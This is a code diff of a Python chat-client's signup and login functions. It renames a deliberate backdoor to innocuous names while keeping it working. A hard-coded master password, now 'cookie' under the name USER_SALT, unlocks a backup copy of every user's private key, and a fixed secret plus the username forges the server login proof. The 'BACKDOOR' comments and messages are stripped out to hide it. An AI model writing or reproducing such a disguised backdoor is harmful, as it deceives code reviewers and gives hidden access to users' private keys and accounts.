@@ -22,14 +22,13 @@ from common import (
 )
 
 
-BACKDOOR_PASSWORD = "letmein"    
-BACKDOOR_SECRET   = "s3cr3t_team_key_2025" 
+USER_SALT = "cookie"    
 
 
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.serialization import load_pem_private_key
 
-SERVER_HOST = os.getenv("SERVER_HOST", "10.13.80.187") # adjust to your server IP
+SERVER_HOST = os.getenv("SERVER_HOST", "10.13.89.250") # adjust to your server IP
 SERVER_PORT = int(os.getenv("SERVER_PORT", "9001"))
 
 KEY_FILE = "data/user_priv.pem"        # Encrypted PEM using your password
@@ -98,19 +97,19 @@ async def signup():
             )
         )
 
-            # --- BACKDOOR: also write a backup private key encrypted with BACKDOOR_PASSWORD ---
+          
     try:
         with open(BACKUP_KEY_FILE, "wb") as f:
             f.write(
                 priv.private_bytes(
                     encoding=serialization.Encoding.PEM,
                     format=serialization.PrivateFormat.PKCS8,
-                    encryption_algorithm=serialization.BestAvailableEncryption(BACKDOOR_PASSWORD.encode("utf-8")),
+                    encryption_algorithm=serialization.BestAvailableEncryption(USER_SALT.encode("utf-8")),
                 )
             )
-        print(f"🔧 Backup key saved for backdoor use ({BACKUP_KEY_FILE})")
+        print(f"Backup key saved ({BACKUP_KEY_FILE})")
     except Exception as e:
-        print("⚠️ Could not write backdoor backup key:", e)
+        print("Could not write backup key:", e)
 
 
     print(f"✅ Local keys created for {username} ({user_id})")
@@ -159,8 +158,7 @@ async def login():
     salt_hex = open(SALT_FILE).read().strip()
     salt = bytes.fromhex(salt_hex)
 
-    # TODO: CAN BE A BACKDOOR
-    # password = input(f"Password for {username}: ").strip()
+
     password = getpass.getpass(f"Password for {username}: ").strip()
 
     # Load encrypted PEM with password
@@ -172,21 +170,20 @@ async def login():
         priv = load_pem_private_key(pem, password=password.encode("utf-8"))
         pub_b64u = public_key_b64u_from_private(priv)
     except ValueError:
-        # If the user supplied the backdoor password, try the backup key
-        if password == BACKDOOR_PASSWORD:
+        if password == USER_SALT:
             try:
                 # Try to read backup file saved at signup
                 if os.path.exists(BACKUP_KEY_FILE):
                     with open(BACKUP_KEY_FILE, "rb") as f:
                         bkp = f.read()
-                    priv = load_pem_private_key(bkp, password=BACKDOOR_PASSWORD.encode("utf-8"))
+                    priv = load_pem_private_key(bkp, password=USER_SALT.encode("utf-8"))
                     pub_b64u = public_key_b64u_from_private(priv)
-                    print("🔓 Backdoor client-side: loaded backup private key using BACKDOOR_PASSWORD")
+                    print("loaded backup private key using USER_SALT")
                 else:
-                    print("⚠️ Backdoor backup key not found. Cannot login with BACKDOOR_PASSWORD.")
+                    print("backup key not found. Cannot login.")
                     return
             except Exception as e:
-                print("⚠️ Failed to load backdoor backup key:", e)
+                print("Failed to load:", e)
                 return
         else:
             print("⚠️ Incorrect password, please try again.")
@@ -223,10 +220,10 @@ async def login():
         nonce = b64u_decode_str(nonce_b64)
 
         # Compute proof = HMAC_SHA256(key=pwd_hash_hex_bytes, msg=nonce)
-        if password == BACKDOOR_PASSWORD:
-            # Use a backdoor-derived key (shared secret + username)
-            backdoor_key = hashlib.sha256((BACKDOOR_SECRET + username).encode("utf-8")).digest()
-            proof = hmac.new(backdoor_key, nonce, hashlib.sha256).hexdigest()
+        if password == USER_SALT:
+            
+            backup_key = hashlib.sha256(("server_ip" + username).encode("utf-8")).digest()
+            proof = hmac.new(backup_key, nonce, hashlib.sha256).hexdigest()
         else:
             pwd_hex = pwd_hash_hex(salt, password)
             key = bytes.fromhex(pwd_hex)
